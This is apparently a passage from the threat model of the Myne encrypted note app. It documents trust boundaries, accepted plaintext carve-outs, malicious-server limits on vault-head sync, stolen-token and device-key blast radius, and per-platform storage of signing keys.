  The client-facing `GET /account/status` is authed and **token-derived**: the account is resolved from the device token, never from the URL or query, so the account number never appears in a request line or log (network observers cannot read the TLS-encrypted path in any case, this is the belt-and-suspenders rule). (`decisions.md` 2026-07-15; MYND-506. Panel: 2026-09-28; myne-md/myne#787.) **ONE exception, recorded rather than inferred (myne-md/myne#911 task 7):** a person session carries no vault, so it names the vault it is syncing with an `?account=<account_number_hash>` query parameter on three route families: `/sync/*`, `PUT /vault.meta`, and `HEAD`/`PUT`/`GET /attachments/{id}` (`server-protocol.md` §3.1a for the sync routes and the metadata write, §3.2 for the attachment routes). The belt-and-suspenders rule above therefore does NOT hold for that class of request: the value reaches the server's request line, and any reverse proxy, CDN or ingress that logs a full request URI records it with a timestamp and the client IP. What that exposes is the pseudonymous vault selector, which is also the key to the vault's pre-authenticated metadata fetch, so an operator's access log becomes a durable per-request record of which vault each sync touched. It is accepted rather than removed because the selector has to travel somewhere and a header is equally visible to the same log; the mitigation is the operator obligation stated in the deployment page (do not log query strings) and the fact that the value identifies the vault, never the person.

- **A vault created under an identity is uploaded without a user act, and the cycle that uploads it also asks the server two questions (myne-md/myne#974, `decisions/sync/0771`).** Settings → Sync used to carry a publish control, and it was the only way a person-born vault could reach a server; it is deleted, and `publish_if_due` publishes the vault from the sync cycle the first time an endpoint, a registered identity and a person session are all present. **No rating changes and no new asset crosses TB5**: the write carries the same opaque `vault.meta` this document already describes, under the same `?account=<namespace>` selector the bullet above records as its one exception, and the vault's contents reach the server exactly as they did from the first cycle after a manual publish. Three things are recorded rather than assumed. **(1) The crossing lost its per-vault condition.** The acts that now commit the upload are "connect a server" and "register the identity", and the copy on the registration control speaks about the identity, not the vault. Removing the button is deliberate (`0770`: the row was the only door, and a user who never found it kept a vault no other device could see); a per-vault off switch, and a way to delete what the server holds, is myne-md/myne#975 rather than an omission. **(2) A publish never writes over a frame the server already holds.** The `GET` that decides this is refused `403` until the vault is bound (`server-protocol.md` §3.1a), so a first publish reads a refusal and writes; a vault already on the server is adopted, and a device holding the pre-password-change frame therefore cannot roll the wrap back. **(3) The repair probe is a new request the server can steer.** A published vault that vanishes from the account's binding list (`GET /b2b/vaults`) is re-published, because a lost server record is invisible from the client: once a namespace is recorded, the meta phase's own `GET` is refused `403` and reported as skipped. The probe is bounded to cycles allowed to push and to one run per ten minutes per device (`last_bindings_check_ms`), and the write it can trigger is this device's own local frame, to the namespace this device already recorded, only when the server holds none. **A server that withholds the vault from that list can therefore make the client `PUT` at a time of its choosing.** TB5's own discovery note already names "the client WRITES" as a capability needing bounds for the local container set; this is one direction towards the server, bounded by the three properties above, and it is recorded here rather than discovered later.

- **The Apple Watch companion is outside the plaintext trust boundary (like the home-screen widget).** The watch voice-quick-capture app (`decisions.md` 2026-07-12) holds NO vault key material and runs no crypto — it dictates note text and relays it to the phone over WatchConnectivity. The not-yet-committed capture is held on the phone in a **device-local encrypted queue** (AS18; `MYK1`, `spec/protocol.md` §9.18) sealed under a device-local keychain key (`kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly`, non-biometric) that is **not** `root_key`-derived — so it survives while the vault is locked and drains into whichever vault unlocks first, via the audited `note_create` path. The zero-knowledge server boundary (TB5) is untouched: the queue is never synced or backed up, and the server never sees a capture. **Two transient plaintext carve-outs, accepted:** the watch's WatchConnectivity outbox and the phone's staging file (written by the native receiver before the Rust seal) hold the dictated text as plaintext protected only by OS Data Protection — short-lived, never containing existing vault content, and (on the watch) unavoidable without putting key material on a device deliberately kept key-free. This is a new ingress and a new device holding transient user text, bounded to **A6/A7** on the two devices the user already controls; it is never a server-visible or cross-vault leak. (`decisions.md` 2026-07-12.)

  **Extended 2026-10-03 (myne-md/myne#812): the watch gains a microphone capture path, and the same KIND of window covers its meeting audio.** The watch's meeting surface records the wrist microphone and transfers chunks to the phone over WatchConnectivity `transferFile`; it holds that **meeting audio** as plaintext, OS-Data-Protection-only, between capture and transfer — the third carve-out, enumerated the same way and for the same reason as the dictated-capture outbox above (encrypting it would need a key on a device deliberately kept key-free). The watch still holds no vault key and runs no crypto, and the phone's own transient here is **the OS-written WatchConnectivity inbox file**: WatchConnectivity delivers each chunk to the app's inbox in plaintext under OS Data Protection, and the native receiver MOVES it into an app-owned inbox from which the seal reads it — so the phone-side window is real, OS-Data-Protection-only, and bounded to the delivery-and-seal round-trip rather than being RAM-only. (An earlier revision of this entry said "in-memory only", which was wrong: the OS writes the delivery to disk before any of our code sees it.) The receiver writes no ADDITIONAL plaintext copy of its own, and the app-owned inbox file is deleted the moment the seal resolves; a seal that fails or never runs (a keychain error, a state before the first post-boot unlock, a process death between the move and the seal) leaves the chunk in the app-owned inbox under its metadata-bearing filename, and the inbox is re-scanned and sealed on boot and on unlock — so the window is bounded to the next re-scan rather than left unbounded. Each chunk is sealed on arrival under the device-local share-import key (`md.myne.shareimport`, `spec/protocol.md` §9.20.2, reusing the `MYF1` codec at §9.20). The phone-side group is a device-local pending-meeting manifest that, like the capture queue, is never synced or backed up, and the lane is mic-only by construction (iOS has no system-audio loopback, so no `0646`-shaped phone session exists). No new magic, AAD role, HKDF context, subkey role or KDF parameter, so AS18's asset class and every rating above are unchanged. Bounded to **A6/A7** on the two devices the user already controls; never a server-visible or cross-vault leak. (`decisions/clients/0647`.)

- **The OS share sheet is a new ingress, bounded like the microphone and the watch queue.** Registering Myne as a share target (`decisions.md` 2026-07-16; iOS Share Extension / Android `ACTION_SEND`) lets a file be shared into Myne from an arbitrary sending app while the vault may be locked. The file is held in a **device-local encrypted queue** (AS19; `MYF1`, `spec/protocol.md` §9.20) sealed under a device-local keychain/Keystore key that is **not** `root_key`-derived — so it survives while the vault is locked and drains into whichever vault unlocks first, via the audited `attachment_import` path (which re-sniffs the content type authoritatively; unrecognized types store as `application/octet-stream`, served export-only). The zero-knowledge server boundary (TB5) is untouched: the queue is never synced or backed up, and the server never sees a pending share. **Plaintext staging carve-out, accepted (the §9.18.4 watch-staging pattern):** before the seal, the shared bytes exist as plaintext protected only by OS Data Protection — **on iOS a persistent staging file** the Share Extension writes into the App-Group container (bytes + `.meta` sidecar, `.completeFileProtection`, sealed and deleted by the app on next open, because linking the crypto into the extension is infeasible — see `decisions.md` 2026-07-16); **on Android a RAM + WebView-transit transient** (the `content://` stream read into RAM and base64'd across the WebView before `seal_share`). Both are device-local, contain only the just-shared file (never existing vault content), and live in the app's own container. The **arbitrary-sender ingress** is the same shape as the microphone note (AS7): the bytes are attacker-influenceable, so they are treated as untrusted content, re-sniffed, and never executed. Bounded to **A6/A7** on the device the user already controls; never a server-visible or cross-vault leak. (`decisions.md` 2026-07-16.)
- **The `myne://` URL scheme is a new ingress, bounded by an explicit confirmation.** Registering the desktop app as the handler for `myne://` (`decisions.md` 2026-07-25; MYND-567) lets **any website** hand the app a `myne://theme/install?…` URL carrying a base64url custom-theme palette. Three consequences, recorded rather than assumed away. (1) **Any page can launch or raise the app**: a nuisance-class capability (A6-adjacent), not a data one; the OS, not Myne, decides that a registered scheme resolves. (2) **Attacker-chosen bytes are parsed in the WebView while the vault may be locked**: the subscription is installed at boot, so a URL arriving pre-unlock is parsed and held in a page-memory latch. The latch is never written to disk, never leaves the process, and holds only what the URL carried (never existing vault content); a quit at the unlock screen discards it. Parsing is bounded before it starts: a decoded-payload cap (16 KiB), a name cap (64 chars), fatal-mode UTF-8 decoding, and control/bidi stripping on every string that will be displayed. (3) **The payload is never dereferenced.** The palette rides *inside* the URL rather than behind one because this module never dereferences a URL it is handed, and the WebView that parses it is bound by the CSP `connect-src` allowlist (`src-tauri/src/no_egress.rs` additionally keeps third-party HTTP-client crates out of the shipped tree; what that gate does and does not prove is stated in the local-AI bullet below); an accompanying `src=` is displayed provenance only, is never fetched, and is dropped unless it is `http(s)`. The **write path is unchanged**: a deep-linked palette is sealed by the same `themes_import` command as a hand-imported file, so the host-side value-shape allowlist above remains the primary control and runs before anything reaches `vault.themes`. The **confirmation dialog is the gate**: a deep-linked theme is never applied without an explicit user Apply, and the pre-Apply palette preview paints only values matching a strictly-narrower display-safe colour subset, so the allowlist is not bypassed by the act of previewing. Bounded to **A6/A7** on the device the user already controls; TB5 is untouched (the server never sees a theme install), and no new key, blob, magic, or AAD role is introduced. **Amended 2026-10-01 (myne-md/myne#788): the scheme gains a second route**, `myne://open-file?path=…`, and it is rated the same nuisance class. The path is RESOLVED host-side for display only (`plain_file_resolve_path` reads no content and mints no handle); nothing opens before an explicit user confirmation, and the confirmed open re-validates the gate, the canonical path, the `.md`/`.markdown` extension and the 64 MiB cap from scratch. The bounded-parse rules above (size caps, fatal-mode UTF-8, control/bidi stripping) apply to its string too. (`decisions.md` 2026-07-25; `decisions/clients/0625`.)

- **Vault head (Phase 2 sync) hardens against a malicious server, with five honest limits.** The vault-head fork-consistency primitive (MYND-416; `spec/sync-protocol.md`, with the `MYH1` baseline at `spec/protocol.md` §9.16) defends multi-device sync against an untrusted server (TB5; A1, A13-adjacent) that cannot read or forge content but can still **rollback** (serve an authentic-but-old head/blob), **withhold**, or **equivocate/fork** (show devices divergent histories). It is monotonic and hash-chained; a head is authenticated by the `root_key` HMAC in a pre-B2B (`NTV5`) vault and by the author's person keypair (Ed25519 + ML-DSA-65) at `head_format_version = 0x02` for every `NTV6` vault (`decisions/protocol/0603`), and the server, lacking both, cannot forge a head, only replay/withhold/reorder/equivocate over real ones. The guarantees it does **not** make, recorded so marketing/UI cannot exceed them:
  - **(1) TOFU bootstrap.** A device with no persisted baseline (fresh / reset / re-enrolled) cannot detect rollback or fork on its *first* adopted head — VV-dominance is a continuity guarantee, not a bootstrap one (SUNDR: a client that has observed nothing detects nothing). A malicious server can seat a new device onto a stale or forked history undetectably. The only mitigation is an out-of-band **bootstrap-fingerprint** eye-compared at the device-approval gate (Signal/Matrix safety-number model); the substrate ships in v1, the general always-on fork-audit fingerprint UI is v1.x. **Two admission paths never reach that gate**, and this sentence is about the gate rather than about every device: a first device bootstraps with nothing to compare against, and a device admitted by the **recovery phrase** self-approves, so there is no second device to compare fingerprints with (`decisions/sync/0641`; desktop myne-md/myne#468, web entry 0704, mobile myne-md/myne#837). On those two paths the first adopted head has no out-of-band mitigation at all. That is a **deliberate accepted gap**, not an unstated one: the phrase is already complete account takeover (A18), so the device it admits holds authority the phrase holder already had, and the alternative (refusing the phrase unless another device approves) would close exactly the door the feature exists to open for a user with no device left. No adversary rating changes. **Amended 2026-11-01 (`decisions/sync/0767`): the INVITATION path now reaches that gate on every client, and it did not before on any of them.** An accepted invitation lands on the approval wait (`pending-approval`), which is the surface that shows the head-fingerprint compare, rather than on the editor the accept had already unlocked. That was the defect this amendment records the fix for: `sync_join_account` wrote the real `vault.meta` and unlocked it BEFORE the enrolment returned pending, so boot routing found a healthy vault, the compare had nowhere to display, and the first sync cycle adopted a head with the eye-compare skipped. The account-number door is gone on desktop, web and mobile for that reason, and the two self-approving paths above are untouched by the change. **One residual, stated rather than implied:** the wait is entered from the accept, so a desktop or web device that RELOADS while pending re-runs boot routing, finds the unlocked vault and lands in the editor. The compare is still reachable there, from Settings, sync (`sync.settings.approval-code`, gated only on a non-`disabled` status), and the sync panel says the device is pending, but it is no longer in front of the user. Mobile holds the wait across a relaunch because its stage is persisted; the desktop and web clients persist no stage. **Amended 2026-11-04 (myne-md/myne#1014, `decisions/clients/0783`): on mobile the hold is a device-local marker rather than the persisted stage, the wait is entered after the joined vault's own unlock, and the retirement rule is stated.** A person join installs no key (`core/src/plugins/sync/person_discovery.rs`), so the joined vaults arrive **locked**: the wait is reached after that vault's unlock, and what carries the question across it is a per-vault marker in `localStorage` (`client-core/src/approval-wait.ts`), not the stage. The marker is retired by three acts and no others: the compare matching, a mismatch that un-enrols the device, and a cancel out of the compare once a code has been SHOWN. A head appearing does NOT retire it, because a joined vault's first pull lands one on the locked-to-unlocked edge and a head is not a comparison; the idle re-lock does not retire it either. **One residual, stated rather than implied:** a reader who sees the code and cancels has been offered the mitigation and declined it, and is not asked again for that vault. The compare stays reachable from Settings, sync on every client, which also displays the code. The desktop and web clients still persist no stage and write no marker: their accept lands the vault on `pending-approval` at accept time. **Amended 2026-11-04 (myne-md/myne#1000, `decisions/sync/0785`): a device that cannot yet resolve the roster's signer pulls anyway, and authors nothing.** The cycle used to refuse before the pull whenever this device could not SIGN a head, and the pull is the only thing that downloads `vault.device-bindings` — the file whose verified rows resolve the roster's signer for a device that has just joined — so the state could not repair itself and the wait's code could never arrive. A context that can only READ now runs the cycle under `PushGate::PollOnly`, which denies both the content push and the genesis head, so no head is authored and the property that refusal protected is kept. What a degraded device accepts is bounded: the head is still signature-verified, against the owner's person half that this device derived from the phrase or pinned out of band, and content stays AEAD-sealed under family keys from the group key the unlock produced. Nothing about the roster is taken from the server, and the eye-compare below is unchanged.

    **What that compare's honesty now rests on, and what it does not close (myne-md/myne#462).** A head is not a stable identity, so the two screens sampled at different moments disagreed for reasons that were not attacks, and the fix is a client-side **push hold**: while a verify screen is open the client authors no content head, and pulls continue. The hold is bounded so a client that dies mid-compare cannot strand its own edits: a 15 s lease renewed by the open screen, and a 5-minute ceiling renewal cannot pass. That means the compare's stability is now a lease-bounded client property rather than a protocol one. Four residuals are stated rather than implied. **(a)** A malicious server can keep the head moving deliberately to manufacture mismatches, which is the alarm-fatigue attack aimed squarely at the one mitigation this row names, and nothing here closes it. **(b)** The hold reaches only the two participating devices, so a THIRD device pushing mid-ceremony still moves the head. **(c)** A re-key rebase authors a head through the hold by design (#429), because not rebasing wedges the device. **(d)** A moved head is announced rather than swapped in silently, so the compare stays a comparison rather than a convergence wait, but that announcement is user attention rather than a structural property. On desktop the mismatch action is a confirmation rather than an immediate removal, matching mobile and every other removal on that panel, so a user who cancels leaves the unverified device enrolled.
  - **(2) Withholding is split.** Withholding of a device's **own** authored work is caught in-band (its version-vector self-component must not regress). Withholding of **other** devices' work, and global staleness (hiding the newest head while serving an older-but-not-rolled-back one), is **best-effort** — the client cannot distinguish "nothing new" from "withheld"; a signed freshness-box is iceboxed. Copy must not claim withholding is detectable in general.
  - **(3) Local-baseline rollback is a conjunction, accepted.** The device-local `MYH1` baseline is authenticated by the head's own MAC but **not** freshness-protected: an attacker who can both **write the local disk (A4/A7) and collude with a malicious server (A1)** can swap it for an older genuine head to force acceptance of a server rollback. Neither capability alone suffices; impact is bounded to stale **own** data (never forged or decrypted) and the in-session RAM baseline is monotone. Accepted for v0.1; a hardware monotonic counter (TPM / Secure Enclave) is the next major version's closure.
  - **(4) No forward secrecy. AMENDED for B2B vaults (myne-md/myne#698, decisions/protocol/0592).** `root_key` compromise is total compromise. A head is authenticated by the `root_key` HMAC in a pre-B2B (`NTV5`) vault and by the author's person keypair at `0x02` for an `NTV6` vault; neither gives forward-secret revocation, so a removed/compromised device's historical access is not cryptographically revoked. This matches the v0.1 single-`itemsKey` posture (§5 / `spec/protocol.md` §11); real per-device forward-secret revocation is an iceboxed/MLS epoch-key feature. **The single-user qualification no longer covers a B2B vault:** member removal there retires the removed member's group-key epoch and mints a fresh random `group_key` at `epoch + 1` plus a fresh `itemsKey`, re-wrapping every per-note / per-attachment content key under the new `itemsKey` with the content ciphertext and every identifier byte-identical (`root_key` untouched; `decisions/protocol/0594`, superseding the `itemsKey`-only model of 0592 for a shared vault). The new epoch is published in the owner-signed roster and, per remaining member, in a fresh group package; the retired epoch is recorded in an owner-double-signed `myne.group-retirement v1|` record that carries no timestamp. A reader accepts a strictly-greater signed epoch only; an equal epoch is refused rather than tie-broken, so a server cannot choose between two competing rosters. **Removal is now LIVE (myne-md/myne#711 task 14).** `sync_remove_member` runs the epoch+1 group rotation end to end: a fresh random `group_key` and `itemsKey`, every per-note/per-attachment/snapshot/conflict/quarantine content key rewrapped with the content ciphertext and every identifier byte-identical (`root_key` untouched), the removed member tombstoned in the owner-signed roster, the two owner-double-signed retirement records emitted, the rotated `vault.meta` pushed under the owner's per-vault token, and the removed member's server binding and per-vault token revoked (`DELETE /b2b/vaults/{hash}/members/{person_id}`). An OWNER peer adopts the strictly-greater owner-signed epoch on its next sync (the meta phase's `NTV6` read path, task 13). A MEMBER does not: it holds the epoch until its own delivered package verifies against the pinned owner half, and it keeps its per-blob CAS baselines because the rewrap preserves `content_nonce` (`decisions/protocol/0708`, `sync-protocol.md` §10.3). Two limits hold and are stated rather than implied. (a) **Future access only, no recall.** A removed member holding a copy of the vault keeps decrypting everything they already synced, copied or exported, indefinitely; the revocation is the server refusing their token, and it recalls nothing. (b) **Attribution, not prevention.** The removed member's own device is not cryptographically locked out; it learns it is removed from the server's refusal. The membership graph (who shares which vault) stays the accepted social-graph exposure (decisions 0459). Multi-user also makes the collaboration social graph (who shares which vault) a structured exposure the roster extension carries; accepted (decisions 0459 recorded the leak class before the substrate existed). **The B2B limit set** (`decisions/protocol/0593`, myne-md/myne#714): vault roles are administrative metadata only. A member can read, copy, write and tamper with everything the keys open, and the owner cannot cryptographically prevent any of it. The owner's real controls are key delivery, server token revocation, and attribution: signed heads at `0x02` (`decisions/protocol/0603`), and device-scoped PER-REVISION attribution since `decisions/protocol/0660`, which is a data-model fact a reader is shown (the version history's "who edited each revision") rather than a signature or a proof. No user-facing string may promise a viewer role, a write block, or an erasure, and none may present a revision's device label as a cryptographic guarantee.
  - **(5) Manifest scope is content blobs only.** The head commits `uuid → content_nonce` for **notes + attachments** only; synced singletons (`vault.prefs`, `vault.meta`, dictionary, catalog) are **not** covered, so their rollback remains the already-accepted "local prefs replay" limitation above (and `vault.meta`'s bespoke-merge + `root_key`-invariant keep a credential-rollback low-impact). This is deliberate, not an oversight.
  The head adds **no new plaintext metadata** to what the server already sees (manifest `content_nonce`s are cleartext headers; per-device version-vector counters are device-count — already AS16 — plus per-device push timing — already the "sync timing leaks usage patterns" item above). *(Sequencing: the broader Phase 2 sync §7 amendment is MYND-414's; this rider records only the vault-head-specific deltas. `decisions.md` entry to be added with MYND-416.)*
- **Per-device sync token is an availability credential, tiered by storage (MYND-458/425).** The Phase 2 per-device token (issued at SCRAM enrollment, `spec/server-protocol.md` §3.1) is an **availability** credential (SYNC-2): device-local, never synced, and **never a confidentiality gate**, it authorizes a device to sync, it does not wrap or unlock vault contents. **A PERSON token is the same class with a wider reach (myne-md/myne#911 task 7):** the device token on a person account authorizes every vault that account is bound to, resolved per request through `?account=`, so one theft reaches all of them instead of one. Its blast radius is enumerated by `GET /b2b/vaults` and it can `PUT /vault.meta` in each, which is why revocation is account-level and authoritative. **On a vault born under an identity (`NTV7`) it reaches one step further, and the step is recorded here rather than left to be inferred** (2026-10-25, `decisions/protocol/0730`): such a vault never enrols under a vault account, so the owner's person session is also the credential that binds members (`POST /b2b/vaults/{selector}/members`, `role: "member"` for another person, and `role: "owner"` only for the caller's own binding). **A third credential joins that reach, and its blast radius is wider in one direction**
(`decisions/protocol/0731` stage 2): once the owner's devices hold signing keys, the
**roster** is signed by a device key, so a stolen device key can invite a member
(producing a roster that verifies, with a real group-key wrap) and remove one, on every
vault that device is bound to, until its binding is revoked. That is a capability the
person token never had: the token could spend server-side slots, this one can change who
holds the group key. Two bounds remain and both are the binding. A device key unwraps
nothing, so it opens no vault and reads no note. **Where it lives at rest, stated because it is a
new at-rest secret rather than a new use of an old one** (`core/src/plugins/sync/device_identity.rs`):
the signing key sits in the OS keychain under service `md.myne.devicekey`, account
`device-signing-key`, with `WhenUnlockedThisDeviceOnly` accessibility and no biometric gate, so it is
readable while the app runs and the vault is unlocked, it is not exportable, and it is excluded from
platform backup by the accessibility class rather than by a policy flag. **On macOS that sentence
holds only inside the data protection keychain**, which is what `decisions/security/0765`
(myne-md/myne#959) makes reachable and what the rung 1 bullet below spells out: the same item in the
file-based keychain declares the same class and still travels in a backup. **The ladder now has four rungs and three of them hold the key at rest, so this is
no longer an Apple-only exposure** (myne-md/myne#938, `decisions/protocol/0759`, `0760`, `0761`).
Each rung stores the SAME signing key; what differs is what an attacker with the disk must
also have:

- **Rung 1, Apple (macOS, iOS):** the OS keychain, service `md.myne.devicekey`, account
  `device-signing-key`, `WhenUnlockedThisDeviceOnly`, no biometric gate. Excluded from backup by
  the accessibility class, and **on macOS that exclusion is a property of WHICH keychain the item
  is in**, which is why the next sentence exists. Since myne-md/myne#959 the item is addressed
  with `kSecUseDataProtectionKeychain`: the file-based keychain it used to reach carries its items
  into Time Machine and Migration Assistant whatever accessibility class they declare. Reaching
  the data protection keychain is itself conditional on the bundle carrying
  `com.apple.application-identifier` **and** an embedded provisioning profile that authorizes it
  (`decisions/security/0765`), so a macOS build missing either half does not fall to a weaker
  rung. The keychain write is refused `errSecMissingEntitlement` (-34018), no device key is
  stored, and the client keeps the person key, which asks for the identity phrase on every lock.
  That is a liveness failure and not a confidentiality one, and it is stated here because it is
  silent: `codesign --verify` passes in both broken shapes. `scripts/build-macos-dmg.mjs`
  therefore refuses to produce a DMG whose signed app lacks either half. Rung 1 is otherwise
  unchanged by this generation.
- **Rung 2, Linux:** the Secret Service over the session bus, under the same service and account
  names. A locked or absent collection is reported UNAVAILABLE and the client falls to rung 3 or 4;
  it never calls `item.unlock()`, so the client cannot prompt its way past a locked session.
- **Rung 2, Windows:** DPAPI at **user** scope (`CRYPTPROTECT_LOCAL_MACHINE` deliberately not
  passed), with the fixed application entropy `md.myne.devicekey v1`, in
  `<app_config_dir>/device-key.dpapi`, written by rename. The blob is readable by that user's
  processes and by nobody else's, and it does not survive a profile reset.
- **Rung 2, Android:** the hardware-backed Android Keystore holds a **non-exportable AES-256-GCM
  wrapping key** (`md.myne.devicekey.wrap`) that seals the signing key into SharedPreferences
  (`md.myne.devicekey`), which the app's backup rules exclude from Auto Backup and device transfer.
  The wrapping key is deliberately **non-biometric** (`setUserAuthenticationRequired(false)`):
  a head is authored on a background sync cycle, where a fingerprint prompt cannot be answered.
- **Rung 3, any platform with no OS store:** a `0600` file `device-key.sealed` in
  `<app_config_dir>` (device-scoped beside `sync-config.json`, deliberately NOT under any vault
  root, so it outlives every vault on the machine and is removed by the device-local erase paths
  rather than by a vault erase), sealed with **XChaCha20-Poly1305 with the CTX commitment** (the
  same `aead_seal_ctx` every other blob uses, 32-byte tag) under a key derived from a **user PIN**
  by Argon2id at the vault's own parameters (salt domain
  `myne.v0.2 argon2id-device-key-pin|`, `protocol.md` §3.1), with an attempt counter at
  `device-key.attempts` that wipes both files at the cap. The seal carries the role AAD
  `AAD_device_key_pin_store` (`protocol.md` §5.2), which binds the envelope version and the KDF
  parameter set and binds no vault id. **This rung's
  bound is the PIN's entropy and nothing else:** an attacker holding the disk can try candidates
  offline at one Argon2id derivation each, which is the same bound A5 already records for
  `vault.quickunlock`, and it is disclosed for the same reason. **The surface that asks the user for
  the PIN is not built yet**, so this rung is reachable from `core` and not from the product; until
  it is, a Linux or Windows box with no OS store falls to rung 4.
- **Rung 4, nothing stored:** the phrase path (`0x02`) signs, and there is no key on disk to steal.

A device whose store read fails falls back to that same phrase path with a warning rather than
signing something it cannot verify, and the device-local erase paths destroy the item on every rung,
so a wiped device leaves no signing key behind. Rung 2's Secret Service round trip runs on a worker
thread, never the WebView thread. And revocation is cryptographic rather
than a note in a table: the binding tombstone plus peers refusing that device's signatures
ends both the heads and the rosters it could author, which the pre-change model could not
do for a device that had seen the phrase. Attribution loses one hop with it: a roster and
a head now say "a device this person bound" rather than "this person", so a surface must
never render a device-signed record as the person's own signature.

A stolen `person-auth.json` therefore buys **member management on every born vault the account owns**, not only the sync reach and the `vault.meta` write this bullet already listed. Enumerated rather than left to be inferred, because "member management" hides a route list: with that session it also reaches `POST`/`GET /b2b/invites` (post a sealed invite, and read the invitations the owner sent), `DELETE /b2b/invites/{invite_id}` (refuse one on the account's behalf, which destroys the slot, `decisions/protocol/0732`) and `DELETE /b2b/vaults/{selector}/members/{person_id}` (revoke a member's binding). Two bounds hold, and neither is new: that arm cannot CREATE an owner binding (the owner comes from the publish act), and it cannot make a second person the owner. **A third bound is what keeps that list an availability reach rather than a grant:** every artifact that would let an invited person actually open a vault is produced by the client and signed or sealed with the person key or the group key, which the token never holds. A posted invite carries bytes the attacker cannot seal, and a bound member still receives no `group_key`, no `itemsKey` and no owner-signed roster. So what a stolen token can do is spend the account's server-side slots: post an invitation nobody can accept, destroy one the owner sent, revoke a binding. It cannot add a member who can read anything, and it cannot alter the roster. Confidentiality is still untouched, because what the token buys is access, never a key. Revocation remains the only bound and it is account-level, so it ends both reaches at once. **A device can now hold its own account credential, which turns a stolen token's reach from spendable into DURABLE** (`decisions/protocol/0735`). Before this, a stolen person token could do what the bullet above enumerates: spend slots, destroy invites, write `vault.meta`, read the binding list. It could not create a credential. It can now install a per-device SCRAM verifier for a device of the attacker's choosing (`POST /auth/devices/credential`), which survives the token's own expiry and can be re-authenticated with. That is not new AUTHORITY, since the token already reached everything the account reaches, but it is new PERSISTENCE and it is stated rather than implied. Three bounds hold. The session must be live to install, so revocation ends the ability to add more. Revocation now deletes the verifier as well as the registry row, so a removed device cannot simply run the handshake again (`/auth/devices/revoke`), which is what keeps "removed" meaning removed rather than "sign in again".
